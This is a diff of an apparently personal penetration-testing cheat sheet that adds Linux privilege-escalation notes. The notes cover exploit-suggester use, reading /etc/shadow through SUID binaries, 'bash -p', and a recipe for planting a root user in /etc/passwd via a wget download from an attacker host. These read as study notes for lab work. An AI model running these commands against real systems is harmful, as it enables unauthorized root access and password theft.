@@ -908,6 +908,14 @@ id
 whoami
 ```
 
+9. Environment variables <skipped>
+- https://macrosec.tech/index.php/2021/06/08/linux-privilege-escalation-techniques-using-suid/
+
+10. Binary Symlinks <skipped>
+- https://macrosec.tech/index.php/2021/06/08/linux-privilege-escalation-techniques-using-suid/
+- run linux exploit suggester
+- condition 1: nginxed-root.sh[CVE-2016-1247], affecting nginx < v1.6.2
+- condition 2: suid bit set for sudo
 
 
 # Active Directory Pentesting
@@ -1366,13 +1374,16 @@ impacket-secretsdump -just-dc-user *targetuser* corp.com/jeffadmin:"BrouhahaTung
 # MISC
 
 ## General tips
+- If Linpeas cannot found vulnerabilties, use linux-exploit-suggester (https://github.com/mzet-/linux-exploit-suggester)
 - /dev/null is the standard Linux device where you send output that you want ignored.
 - /tmp directory has all permission to create or delete any file, use it
+- if SUID is set ofr a binary program and to GTFObins requires LFILE=file_to_read, we can set LFILE=/etc/shadow, and unhash the password and do a 'su' or switch user.
 - If "/bin/bash" has SUID set, user can execute “bash -p” and this should allow you to run the bash as root.
 - If a user can run all command as root user, we can achieve root access by performing 'sudo su' or 'sudo bash'
 - if '/bin/bash' doesnt work, try '/bin/sh'
 - to run binary program, can specify '/home' instead of current directory '.'
-- to create new user(name: ignite) at end of /etc/passwd, first generate the $hash value first using 'openssl passwd -1 -salt ignite pass123'. Then insert $hash into 'ignote:$hash:0:0:root:/root:/bin/bash'. Then copy the passwd file back to victim machine (/etc) using 'wget -O passwd http://192.168.1.108:8000/passwd'. Then 'su ignite' password: 'pass123', 'whoami'.
+- [if SUID bit set for cp, we can add a new user with root privileges to /etc/passwd file] to create new user(name: ignite) at end of /etc/passwd, first generate the $hash value first using 'openssl passwd -1 -salt ignite pass123'. Then insert $hash into 'ignite:$hash:0:0:root:/root:/bin/bash'. Then copy the passwd file back to victim machine (/etc) using 'wget -O passwd http://192.168.1.108:8000/passwd'. Then 'su ignite' password: 'pass123', 'whoami'.
+- admin to give SUID permission to nano: 'chmod u+s /bin/nano'
 
 ## MSFVenom
 
